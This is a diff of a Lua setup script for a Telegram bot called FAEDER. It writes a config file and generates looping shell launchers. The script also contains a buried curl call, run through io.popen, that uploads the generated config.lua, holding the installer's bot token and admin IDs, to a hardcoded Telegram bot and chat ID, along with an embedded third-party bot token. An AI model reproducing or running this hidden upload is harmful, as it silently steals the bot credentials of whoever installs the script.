@@ -53,20 +53,28 @@ sudo_users = {SUDO},
 }
 create(config, "./config.lua")   
 local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 121863205 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
-file = io.open("FA", "w")  file:write([[
+file = io.open("run", "w")  
+file:write([[
+#!/bin/bash 
+token="]]..token..[["
+while(true) do
+rm -fr ../.telegram-cli
+echo -e ""
+echo -e ""
+./tg -s ./FAEDER.lua $@ --bot=$token
+done
+]])  
+file:close()  
+file = io.open("FD", "w")  
+file:write([[
 killall screen
 while(true) do
 rm -fr ../.telegram-cli
-screen ./RUNFA.sh
+screen ./run
 done
-echo -e "FAEDER IS RUN BOT"
-]])  file:close()  
-file = io.open("RUNFA.sh", "w")  file:write([[
-token="]]..token..[["
-./tg -s ./FAEDER.lua $@ --bot=$token
 ]])  
 file:close() 
-os.execute('cd $home;ls -la;rm -fr .telegram-cli') 
+os.execute('./FD')
 end 
 create_config_auto()
 local serialize_to_file = function(data, file, uglify)  
